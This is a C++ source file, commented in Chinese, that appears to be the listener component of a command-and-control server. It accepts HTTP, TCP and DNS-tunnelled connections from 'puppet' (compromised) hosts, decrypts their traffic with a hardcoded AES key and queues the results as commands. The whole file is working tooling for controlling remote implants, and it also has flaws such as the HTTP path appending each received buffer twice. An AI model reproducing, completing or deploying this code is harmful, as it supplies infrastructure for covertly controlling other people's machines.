#include<sstream>
#include <algorithm>

#include "PuppetManager.h"
#include "NetworkUtilities.h"
#include "AES.h"
#include "DNS.h"


// 新增辅助函数：从HTTP头解析Content-Length
size_t parseContentLength(const std::string& headers) {
    std::istringstream stream(headers);
    std::string line;
    while (std::getline(stream, line)) {
        if (line.find("Content-Length:") != std::string::npos ||
            line.find("content-length:") != std::string::npos) {
            size_t colonPos = line.find(':');
            if (colonPos != std::string::npos) {
                return std::stoul(line.substr(colonPos + 1));
            }
        }
    }
    return 0; // 若未找到，需根据实际协议处理（例如分块编码）
}

bool isDigits(const std::string& s) {
    return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit);
}

void PuppetHandle(int clientID, SOCKET puppetSocket, ServerManager* serverManager, ClientConnectionManager& instance) {
    
    const size_t MAX_BUFFER_SIZE = 10 * 1024 * 1024; // 10MB内存限制
    std::string key = "weiweiSecretKey123!";
    std::string accumulatedData;
    bool isHeadersParsed = false;
    size_t contentLength = 0;
    size_t bodyStartPos = 0;

    // 获取协议类型
    std::string protocol = instance.getClient(clientID)->getProtocol();

    sendPuppetInfo(instance);

    while (instance.getGRunning()) {
        char buffer[BUFFER_SIZE];
        int bytesReceived = recv(puppetSocket, buffer, BUFFER_SIZE - 1, 0);

        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            accumulatedData.append(buffer, bytesReceived);

            if (protocol == "http") {
                // HTTP处理保持不变...
                // HTTP协议处理：解析头部和内容体
                accumulatedData.append(buffer, bytesReceived);

                if (!isHeadersParsed) {
                    size_t headerEnd = accumulatedData.find("\r\n\r\n");
                    if (headerEnd != std::string::npos) {
                        std::string headers = accumulatedData.substr(0, headerEnd);
                        bodyStartPos = headerEnd + 4;
                        contentLength = parseContentLength(headers);
                        isHeadersParsed = true;
                    }
                }

                if (isHeadersParsed && (accumulatedData.size() - bodyStartPos >= contentLength)) {
                    std::string responseBody = accumulatedData.substr(bodyStartPos, contentLength);
                    accumulatedData.erase(0, bodyStartPos + contentLength);

                    std::string decrypted = Encrypt::decodeByAES(responseBody, key);
                    if (!decrypted.empty()) {
                        serverManager->setCmdList(decrypted, false);
                    }

                    if (decrypted.substr(0, 4) == "byby")
                    {
                        instance.removeClient(clientID);
                        sendPuppetInfo(instance);
                    }

                    // 重置状态
                    accumulatedData.clear();
                    isHeadersParsed = false;
                    contentLength = 0;
                    bodyStartPos = 0;
                }
            }
            else if (protocol == "tcp") {
                // 新增带长度前缀的TCP处理
                while (true) {
                    // 查找冒号分隔符
                    size_t colonPos = accumulatedData.find(':');
                    if (colonPos == std::string::npos) break;

                    // 解析长度值
                    std::string lengthStr = accumulatedData.substr(0, colonPos);
                    if (!isDigits(lengthStr)) { // 验证是否为纯数字
                        safePrint("非法长度值:", lengthStr);
                        accumulatedData.clear();
                        break;
                    }

                    size_t dataLength = 0;
                    try {
                        dataLength = static_cast<size_t>(std::stoul(lengthStr));
                    }
                    catch (...) {
                        safePrint("长度转换失败:", lengthStr);
                        accumulatedData.clear();
                        break;
                    }

                    // 检查数据完整性
                    size_t totalNeeded = colonPos + 1 + dataLength;
                    if (accumulatedData.size() < totalNeeded) break;

                    // 提取加密数据
                    std::string encrypted = accumulatedData.substr(
                        colonPos + 1,
                        dataLength
                    );

                    // 解密处理
                    try {
                        std::string decrypted = Encrypt::decodeByAES(encrypted, key);
                        if (!decrypted.empty()) {
                            serverManager->setCmdList(decrypted, false);
                        }

                        if (decrypted.substr(0, 4) == "byby")
                        {
                            instance.removeClient(clientID);
                            sendPuppetInfo(instance);
                        }
                    }
                    catch (const std::exception& e) {
                        safePrint("解密失败:", e.what());
                    }

                    // 移除已处理数据
                    accumulatedData.erase(0, totalNeeded);
                }

                // 内存保护机制
                if (accumulatedData.size() > MAX_BUFFER_SIZE) {
                    safePrint("缓冲区溢出，清空数据");
                    accumulatedData.clear();
                }
            }
        }
        else if (bytesReceived <= 0) {
            // 断开处理...
            instance.setGRunning(false);
        }
    }

    closesocket(puppetSocket);
    WSACleanup();
}

//该函数暂时未使用
void PuppetDnsHandle(int clientID,SOCKET puppetSocket, sockaddr_in puppetAddr,int puppetLen, ServerManager* serverManager, ClientConnectionManager& instance) {

    DNSHeader header{};
    header.id = htons(0x1234);
    header.flags = htons(0x8180);
    TunnelRequest request;
    TunnelResponse response;

    DNS dns(header, request, response);

    std::vector<uint8_t> buffer(512);
    sockaddr_in clientAddr;
    int clientLen = sizeof(clientAddr);

    sendPuppetInfo(instance);

    while (instance.getGRunning()) {

        // 接收响应
        sockaddr_in responseAddr{};
        auto responseFrags = dns.receiveFragmentsServer2Client(puppetSocket, responseAddr);

        std::string cmdResult = dns.assembleFragments(responseFrags);

        if (!cmdResult.empty()) {
            serverManager->setCmdList(cmdResult, false);
        }
    }

    closesocket(puppetSocket);
    WSACleanup();
}

// 处理傀儡端连接
void HandlePuppet(SOCKET listenSocket_puppet, 
    ServerManager* serverManager, 
    ClientConnectionManager& instance,
    std::string protocol,
    std::string port) 
{
    while (instance.getGRunning()) {
        sockaddr_in clientAddr{};
        int clientAddrSize = sizeof(clientAddr);
        SOCKET puppetSocket = accept(listenSocket_puppet, (sockaddr*)&clientAddr, &clientAddrSize);

        if (puppetSocket == INVALID_SOCKET) {

            safePrint("接受连接失败!!!", WSAGetLastError());

            continue;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);

        {
            safePrint("接收到傀儡端连接, IP: ", clientIP, ":", ntohs(clientAddr.sin_port));
        }

        // 创建并初始化 ClientInfo 对象
        sockaddr_in clientSock;
        memset(&clientSock, 0, sizeof(clientSock));
        int clientID = clientAndPuppetConnectionDeal(instance, clientIP, puppetSocket, clientSock, false, protocol,std::to_string(ntohs(clientAddr.sin_port)));

        // 创建线程处理傀儡端
        std::thread puppetThread(PuppetHandle, clientID, puppetSocket, serverManager, std::ref(instance));
        puppetThread.detach();
    }
}

void HandleDnsPuppet(SOCKET listenSocket_puppet, ServerManager* serverManager, ClientConnectionManager& instance, std::string protocol,std::string port) {
    
    DNSHeader header{};
    header.id = htons(0x1234);
    header.flags = htons(0x8180);
    TunnelRequest request;
    TunnelResponse response;

    DNS dns(header, request, response);

    std::vector<uint8_t> buffer(512);
    sockaddr_in clientAddr;
    int clientLen = sizeof(clientAddr);

    int recvLen = recvfrom(listenSocket_puppet, (char*)buffer.data(), buffer.size(), 0,
        (sockaddr*)&clientAddr, &clientLen);

    if (recvLen <= 0) {

        std::cerr << WSAGetLastError() << std::endl;
    }

    // 提取傀儡端发送的呼叫
    std::string query = dns.extractQueryData(buffer);

    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);

    {
        safePrint("接收到傀儡端呼叫, IP: ", clientIP, ":", ntohs(clientAddr.sin_port));
    }

    // 创建并初始化 ClientInfo 对象
    int clientID = clientAndPuppetConnectionDeal(instance, clientIP, listenSocket_puppet, clientAddr, false, protocol,std::to_string(ntohs(clientAddr.sin_port)));
    
    sendPuppetInfo(instance);

    // 接收响应
    sockaddr_in responseAddr{};

    while (instance.getGRunning()) {

        auto responseFrags = dns.receiveFragmentsServer2Client(listenSocket_puppet, responseAddr);

        std::string cmdResult = dns.assembleFragments(responseFrags);

        // 只有当cmdResult非空且至少包含一个可见字符时执行
        if (!cmdResult.empty() &&
            std::any_of(cmdResult.begin(), cmdResult.end(), [](char c) {
                return std::isprint(static_cast<unsigned char>(c));
                }))
        {
            serverManager->setCmdList(cmdResult, false);

            if (cmdResult.substr(0, 4) == "byby")
            {
                instance.removeClient(clientID);
                sendPuppetInfo(instance);
            }
        }

        //由于udp无连接的特性，实现多傀儡传输存在问题，暂时仅仅考虑一个傀儡端
        // 创建线程处理傀儡端
        /*std::thread puppetThread(PuppetDnsHandle, clientID, listenSocket_puppet, clientAddr, clientLen, serverManager, std::ref(instance));
        puppetThread.detach();*/
    }
}


void puppetListenerCreate(std::string command, ServerManager* serverManager, ClientConnectionManager& instance) {
    
    struct  ListenerItem
    {
        std::string name;
        std::string protocol;
        std::string ip;
        std::string port;
    };
    ListenerItem listenerItems;
    std::vector<std::string> Items;
    std::string item = "";
    std::istringstream inputStream(command);

    while (std::getline(inputStream, item, ':')) {
        Items.push_back(item);
    }

    listenerItems.name    = Items[1];
    listenerItems.protocol = Items[2];
    listenerItems.ip      = Items[3];
    listenerItems.port    = Items[4];

    SOCKET listenSocket_puppet = INVALID_SOCKET;

    if (listenerItems.protocol.substr(0, 3) == "dns") {
        
        //基于udp的连接
        listenSocket_puppet = CreateDnsListenSocket(listenerItems.ip.c_str(), static_cast<USHORT>(std::stoi(listenerItems.port.c_str())));
        std::thread puppetThread(HandleDnsPuppet, listenSocket_puppet, serverManager, std::ref(instance), listenerItems.protocol,listenerItems.port);
        puppetThread.detach();
    }
    else
    {
        //基于tcp的连接
        listenSocket_puppet = CreateListenSocket(listenerItems.ip.c_str(), static_cast<USHORT>(std::stoi(listenerItems.port.c_str())));
        std::thread puppetThread(HandlePuppet, listenSocket_puppet, serverManager, std::ref(instance),listenerItems.protocol,listenerItems.port);
        puppetThread.detach();
    }
}